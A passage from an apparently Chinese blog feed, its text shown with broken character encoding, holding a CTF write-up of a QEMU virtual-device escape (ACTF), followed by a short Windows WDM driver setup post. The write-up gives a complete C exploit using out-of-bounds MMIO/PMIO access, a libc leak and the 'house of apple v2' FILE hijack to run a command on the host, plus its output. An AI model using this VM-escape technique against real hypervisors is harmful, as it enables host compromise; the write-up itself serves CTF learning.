<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>pmio_write å¯ä»¥åœ¨ <code>0xa78</code> å¤„ <code>malloc(0x20)</code>ï¼Œå¹¶ä¸”å‘å †å†…å†™å†…å®¹ã€‚pmio_readå¯ä»¥è¯»å–å†…å®¹ï¼Œå¯ä»¥æ³„éœ²libc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x55e880791b30+0xa78</span><br><span class="line">00:0000â”‚  0x55e8807925a8 â€”â–¸ 0x7f712072fde0 â—‚â€” 0x7f71deadbeef</span><br></pre></td></tr></table></figure>

<p>mmio_read&#x2F;write å­˜åœ¨4å­—èŠ‚çš„è¶Šç•Œè¯»å†™ï¼ˆåˆ¤æ–­æ¡ä»¶æ˜¯ <code>&lt;= 0x40</code>æ­£å¥½æ˜¯A78å†…å®¹ï¼Œç»“åˆpmioå¯ä»¥å†™å…¥å†…å®¹ï¼Œå·®ä¸å¤šæ˜¯ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯é«˜4å­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œæ‹¿vmmapæŸ¥çœ‹ï¼Œå¯ä»¥æ”¹å˜libcçš„å†…å®¹ï¼Œå¹¶ä¸”å­˜åœ¨rwxåŒºåŸŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x7f7130000000     0x7f716ffff000 rwxp 3ffff000      0 [anon_7f7130000] </span><br><span class="line">...</span><br><span class="line">0x7f7177f7d000     0x7f7177fa5000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7177fa5000     0x7f717813a000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f717813a000     0x7f7178192000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178192000     0x7f7178193000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178193000     0x7f7178197000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178197000     0x7f7178199000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒç®€å•åˆ©ç”¨æ€è·¯ï¼šmmio_write ä¿®æ”¹<code>IO_list_all</code>ã€‚ä½¿ç”¨ house of apple V2ï¼Œexitè°ƒç”¨å°±é€€å‡ºqemuã€‚</p>
<p>éœ€è¦æ‰¾åˆ°ä¸€æ®µå†…å­˜æ¥æ³„éœ²libcï¼Œä»»æ„ä½ç½®çš„è¯»å†™ï¼Œéœ€è¦æ‰¾åˆ°åˆé€‚çš„ä½ç½®ï¼Œæˆ‘ä»¬æ ¹æ®å…¶æ³„éœ²çš„åœ°å€å¯»æ‰¾ä¸€æ®µåŒºåŸŸã€‚å¦‚ä¸‹æ˜¯æ‰¾åˆ°main_arenaåŒºåŸŸã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pagenameï¼šæˆ‘ä»¬éœ€è¦æ‰¾çš„ï¼Œæ¯”å¦‚libc</span></span><br><span class="line"><span class="comment"># offset: å¯»æ‰¾æ—¶ä¸€æ¬¡å¢åŠ çš„æœ€å¤§æ•°å­—</span></span><br><span class="line">pwndbg&gt; leakfind <span class="variable">$rsp</span> --page_name=filename --max_offset=0x48 --max_depth=6</span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] exp.c       leak : 0x7fa420824160</span></span><br><span class="line">pwndbg&gt; leakfind 0x7fa420000000 --max_offset=0x10000 --page_name=libc -s 8 -d 3</span><br><span class="line">0x7fa420000000+0x8a0 â€”â–¸ 0x7fa470000030+0x870 â€”â–¸ 0x7fa4795e6c80 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<p>çŸ¥é“ä¸Šé¢çš„ï¼Œåœ¨äº†è§£ä¸€ä¸‹house of apple v2 åŸç†ï¼Œå·®ä¸å¤šå¯ä»¥åšå‡ºæ¥</p>
<ul>
<li><code>_flags</code>éœ€è¦è·å¾—<code>shell</code>ï¼Œå‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</li>
<li><code>vtable</code>è®¾ç½®ä¸º<code>_IO_wfile_jumps</code>åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>(A+0xd8) = _IO_wfile_overflow</code>å³å¯</li>
<li><code>_wide_data</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>A</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>B</code>ï¼Œå³æ»¡è¶³<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>è®¾ç½®ä¸ºåœ°å€<code>C</code>ç”¨äºåŠ«æŒ<code>RIP</code>ï¼Œå³æ»¡è¶³<code>*(B + 0x68) = C</code>ï¼Œæ¯”å¦‚è¯´Cä¸ºsystemå‡½æ•°</li>
</ul>
<p>Aï¼ŒBå…¨ä¸ºä¸ºfake_io_addrï¼Œè®¾ç½®ä¸€ä¸‹å°±è¡Œï¼Œç”šè‡³è¿åç§»éƒ½ä¸éœ€è¦æ”¹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, <span class="string">&quot;[*] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, COLOR_GREEN <span class="string">&quot;[+] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT,        \</span></span><br><span class="line"><span class="meta">          __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, COLOR_RED <span class="string">&quot;[-] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT,          \</span></span><br><span class="line"><span class="meta">          __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fatal(fmt, ...)                                                        \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    EMSG(fmt, ##__VA_ARGS__);                                                  \</span></span><br><span class="line"><span class="meta">    exit(EXIT_FAILURE);                                                        \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0xC040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> buf[] =</span><br><span class="line">    <span class="string">&quot;ACTF&#123;cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">inb</span>(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">pmio_readl</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">inl</span>(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title">pmio_readll</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> low, high;</span><br><span class="line">  high = <span class="built_in">pmio_readl</span>(addr + <span class="number">4</span>);</span><br><span class="line">  low = <span class="built_in">pmio_readl</span>(addr);</span><br><span class="line">  <span class="keyword">return</span> (high &lt;&lt; <span class="number">32</span>) | (low &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">outl</span>(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint8_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">outb</span>(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123; <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">arb_write</span><span class="params">(<span class="type">uint64_t</span> where, <span class="type">uint64_t</span> what)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, where &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x10</span>, what &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x14</span>, (what &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_mmio</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> fd =</span><br><span class="line">      <span class="built_in">open</span>(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error setup mmio&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mmio_mem = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error mmap mmio_fd&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;init mmio&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_pmio</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">iopl</span>(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error setup pmio: I/O permission is not enough&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;init pmio&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> ret;</span><br><span class="line">  <span class="type">uint64_t</span> high, low;</span><br><span class="line">  <span class="type">uint64_t</span> leak_main_arena;</span><br><span class="line">  <span class="type">uint64_t</span> libc_base;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Prepare mmio and pmio ...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_pmio</span>();</span><br><span class="line">  <span class="built_in">setup_mmio</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Write state-&gt;buffer...&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(buf); i += <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">mmio_write</span>(i, *(<span class="type">uint32_t</span> *)(buf + i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Write to set 0xA31 to 1...&quot;</span>);</span><br><span class="line">  <span class="built_in">pmio_writeb</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  ret = <span class="built_in">pmio_readb</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;0xA31 : %#lx&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Malloc...&quot;</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x10</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leak libc...&quot;</span>);</span><br><span class="line">  low = <span class="built_in">mmio_read</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, (low &amp; <span class="number">0xff000000</span>) + <span class="number">0x8a0</span>);</span><br><span class="line">  leak_main_arena = <span class="built_in">pmio_readll</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, leak_main_arena + <span class="number">0x870</span>);</span><br><span class="line">  libc_base = <span class="built_in">pmio_readll</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;leak main_arena : %#lx&quot;</span>, leak_main_arena + <span class="number">0x870</span>);</span><br><span class="line">  libc_base -= <span class="number">0x1913c80</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;libc base : %#lx&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> system_fptr = libc_base + <span class="number">0x1749d70</span>;</span><br><span class="line">  <span class="type">uint64_t</span> IO_wfile_jumps = <span class="number">0x19100c0</span> + libc_base;</span><br><span class="line">  <span class="type">uint64_t</span> IO_list_all = <span class="number">0x1914680</span> + libc_base;</span><br><span class="line">  <span class="type">uint64_t</span> fake_io_addr = leak_main_arena + <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;House of apple V2 ...&quot;</span>);</span><br><span class="line">  <span class="type">char</span> cmd[<span class="number">0x18</span>] = <span class="string">&quot;  cat flag 1&gt;&amp;2&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x18</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">arb_write</span>(fake_io_addr + i, *(<span class="type">uint64_t</span> *)(cmd + i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x28</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x68</span>, system_fptr);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xa0</span>, fake_io_addr);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xd8</span>, IO_wfile_jumps);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xe0</span>, fake_io_addr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">arb_write</span>(IO_list_all, fake_io_addr);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># ./exp</span></span><br><span class="line">[+] exp.c       Prepare mmio and pmio ...</span><br><span class="line">[*] exp.c       init pmio</span><br><span class="line">[*] exp.c       init mmio</span><br><span class="line">[+] exp.c       Write state-&gt;buffer...</span><br><span class="line">[+] exp.c       Write to <span class="built_in">set</span> 0xA31 to 1...</span><br><span class="line">[*] exp.c       0xA31 : 0</span><br><span class="line">[+] exp.c       Malloc...</span><br><span class="line">[+] exp.c       Leak libc...</span><br><span class="line">[*] exp.c       leak main_arena : 0x7f0f680008a0</span><br><span class="line">[*] exp.c       libc base : 0x7f0f6d4e9000</span><br><span class="line">[+] exp.c       House of apple V2 ...</span><br><span class="line">[    4.651800] exp (53) used greatest stack depth: 14000 bytes left</span><br><span class="line">~ <span class="comment"># exit</span></span><br><span class="line">[    6.480651] ACPI: PM: Preparing to enter system <span class="built_in">sleep</span> state S5</span><br><span class="line">[    6.481266] reboot: Power down</span><br><span class="line">ACTF&#123;7ry_b4by_q3mu_ch@1leng3_4nd_g3t_b@by_f1ag&#125;</span><br></pre></td></tr></table></figure>


<p>æ›´ç®€å•çš„åŠæ³• todoï¼šå­˜åœ¨ORWå†…å­˜åŒºåŸŸï¼Œå¯ä»¥å†™shellcodeã€‚</p>
<h2 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h2><ol>
<li>qemuä¸­å­˜åœ¨å¾ˆå¤šå‡½æ•°ï¼Œæœ‰æ—¶å€™æ³„éœ²libcæœ‰æ—¶æœ‰ç‚¹å¤šä½™ã€‚</li>
<li>å¯ä»¥åœ¨ State ä¸­å¯»æ‰¾ MemroyRegion çš„ ops</li>
<li>æƒ³è¦ç¬¦å·è¡¨ï¼Œé‚£å°±è‡ªå·±ç¼–è¯‘ä¸€ä¸ªã€‚</li>
</ol>
<p>Qemu8.xä¹‹åæœ‰ä¸ªå·¨å¤§çš„RWXæ®µï¼š<a href="https://eqqie.cn/index.php/archives/2077">[bi0sCTF 2024]: virto-note</a></p>
<h3 id="Qemu-minitor"><a href="#Qemu-minitor" class="headerlink" title="Qemu minitor"></a>Qemu minitor</h3><p> <code>ctrl + a =&gt; c</code> è¿›å…¥minitoræ§åˆ¶å°ã€‚åœ¨monitoræ§åˆ¶å°ä¸­ï¼Œå¯ä»¥å®Œæˆå¾ˆå¤šå¸¸è§„æ“ä½œï¼Œæ¯”å¦‚<strong>æ·»åŠ åˆ é™¤è®¾å¤‡</strong>ã€<strong>è™šæ‹ŸæœºéŸ³è§†é¢‘æˆªå–</strong>ã€<strong>è·å–è™šæ‹Ÿæœºè¿è¡ŒçŠ¶æ€</strong>ã€<strong>æ›´æ”¹è™šæ‹Ÿæœºè¿è¡Œæ—¶é…ç½®</strong>ç­‰ç­‰ã€‚å¹¶ä¸”å¯ä»¥æ‰§è¡Œä¸€å®šçš„å‘½ä»¤</p>
<h3 id="Qemu-KVM"><a href="#Qemu-KVM" class="headerlink" title="Qemu KVM"></a>Qemu KVM</h3><p>KVMï¼ˆKernal-based Virtual Machineï¼ŒåŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºï¼‰æ˜¯ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼Œå¯ä¸ºç”¨æˆ·ç©ºé—´ç¨‹åºæä¾›å®Œæ•´çš„è™šæ‹ŸåŒ–åŸºç¡€æ¶æ„ã€‚ å®ƒå…è®¸ä¸€ä¸ªäººè¿è¡Œå¤šä¸ªè¿è¡Œæœªä¿®æ”¹çš„Linuxæˆ–Windowsæ˜ åƒçš„è™šæ‹Ÿæœºã€‚</p>
<p>KVMçš„ç”¨æˆ·ç©ºé—´ç»„ä»¶åŒ…å«åœ¨ä¸»çº¿QEMUï¼ˆå¿«é€Ÿä»¿çœŸå™¨ï¼‰ä¸­ï¼Œè¯¥QEMUç‰¹åˆ«å¤„ç†è®¾å¤‡ä»¿çœŸã€‚</p>
<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>todo</p>
<ul>
<li>ACTF2023 EasyVirtio CVE-2023-3180</li>
<li>CVE-2019-6778</li>
</ul>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="http://www.phrack.org/issues/70/5.html">VM escape - QEMU Case Study</a></li>
<li><a href="https://xtxtn.github.io/2023/11/02/ACTF2023/">ACTF2023 EasyVirtio</a></li>
<li><a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-devices/01-type_register">understanding_qemu</a></li>
<li><a href="https://eqqie.cn/index.php/archives/1834">https://eqqie.cn/index.php/archives/1834</a></li>
</ul>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>WDM</title>
    <url>/2024/01/27/WDM/</url>
    <content><![CDATA[<blockquote>
<p>Window Driver Module</p>
</blockquote>
<span id="more"></span>
<h2 id="WDK"><a href="#WDK" class="headerlink" title="WDK"></a>WDK</h2><p>VSä¸­æ²¡æœ‰æ‰¾åˆ°å•ä¸ªç»„ä»¶çš„è¿™äº›é€‰é¡¹ï¼Œå› æ­¤ä½¿ç”¨å®˜æ–¹çš„æ–¹æ³•ä¸‹è½½ï¼Œå•ç‹¬ä¸‹è½½sdkå’Œwdk</p>
<ul>
<li><a href="https://blog.csdn.net/qq_44240304/article/details/127549383">window10+vs2022é…ç½®windowé©±åŠ¨å¼€å‘ç¯å¢ƒ</a></li>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk">ä¸‹è½½ Windows é©±åŠ¨ç¨‹åºå·¥å…·åŒ… (WDK) - Windows drivers</a></li>
</ul>
<p>ç„¶åä¼šæœ‰ä¸€ä¸ª <code>VSIX Installer</code>ï¼Œä¸‹è½½å¥½ä¹‹åï¼Œæˆ‘ä»¬çš„VSå°±å¯ä»¥å¼€å‘äº†</p>
<p>æ–°å»ºé¡¹ç›®ï¼Œåº”è¯¥å¯ä»¥çœ‹åˆ° <code>Driver</code> é€‰é¡¹</p>
<p>æˆ–è€…ä½¿ç”¨Windowsæä¾›çš„è™šæ‹Ÿæœº <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">Windows VM</a></p>
<h2 id="é©±åŠ¨å¼€å‘"><a href="#é©±åŠ¨å¼€å‘" class="headerlink" title="é©±åŠ¨å¼€å‘"></a>é©±åŠ¨å¼€å‘</h2><p>windowsé©±åŠ¨åˆ†ä¸¤ç±»ï¼ŒNTå¼é©±åŠ¨å’ŒWDMé©±åŠ¨ï¼Œåè€…æ”¯æŒå³æ’å³ç”¨ï¼›</p>
<p>å› æ­¤é€‰æ‹© <code>WDM(Windows Driver Model)</code>ï¼Œ æä¾›ä¸€ä¸ªé©±åŠ¨å…¥å£ <code>DriverEntry</code> å’Œ é©±åŠ¨å¸è½½ <code>DriverOnload</code> å‡½æ•°ã€‚éœ€è¦æ³¨æ„C++ çš„åç§°ç²‰ç¢æœºåˆ¶</p>
<p>å³é”®ï¼Œå±æ€§ï¼ŒDriver Setting</p>
<ul>
<li>target OS åœ¨VS2022 + win11 å·²ç»ä¸èƒ½æˆåŠŸç”Ÿæˆwin7ç‰ˆæœ¬</li>
<li>target paltform:<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/develop/target-platforms">é©±åŠ¨ç¨‹åºå‚è€ƒé¡µä¸Šçš„â€œç›®æ ‡å¹³å°â€</a></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DbgPrint</span>(<span class="string">&quot;Unload Module Demo\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RigisterEntry)</span> </span>&#123;</span><br><span class="line">	DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="built_in">DbgPrint</span>(<span class="string">&quot;Load Module Demo\r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹æ¡ˆä¾‹ä¸åƒ helloworld çš„æ ·å­ã€‚<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-your-first-driver">åˆ¶ä½œä½ çš„ç¬¬ä¸€ä¸ªé©±åŠ¨ç¨‹åº </a></p>
<ul>
<li>KMDFæ˜¯ç”±å¾®è½¯æä¾›çš„ä¸€ä¸ªé«˜çº§æŠ½è±¡å±‚ï¼Œå®ƒå»ºç«‹åœ¨WDMï¼ˆWindows Driver Modelï¼‰ä¹‹ä¸Šï¼Œå¹¶æä¾›äº†ä¸€äº›é¢å¤–çš„åŠŸèƒ½å’Œç®€åŒ–é©±åŠ¨ç¨‹åºå¼€å‘çš„æ¥å£ã€‚KMDFæ—¨åœ¨ä½¿é©±åŠ¨ç¨‹åºå¼€å‘äººå‘˜èƒ½å¤Ÿæ›´è½»æ¾åœ°ç¼–å†™å’Œç»´æŠ¤å¯é çš„å†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åºã€‚</li>
</ul>
<h3 id="é©±åŠ¨å®‰è£…"><a href="#é©±åŠ¨å®‰è£…" class="headerlink" title="é©±åŠ¨å®‰è£…"></a>é©±åŠ¨å®‰è£…</h3><p>OSRDriverLoader: <a href="https://www.osronline.com/article.cfm%5earticle=157.htm">Downloads:Driver Loader (osronline.com)</a></p>
<ul>
<li>w2k: windows 2000</li>
<li>WLH: windows vista</li>
<li>WNET: windows 7 åŠä»¥ä¸Šã€‚ä½¿ç”¨é‡Œé¢çš„ <code>AMD64 OSRLOADER</code></li>
<li>WXP: windows XP</li>
</ul>
<h3 id="DEbug"><a href="#DEbug" class="headerlink" title="DEbug"></a>DEbug</h3><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/debugview">DebugView - Sysinternals</a>: å®ƒå¯ä»¥æ˜¾ç¤º DbgPrint æ‰“å°å‡ºæ¥çš„log</p>
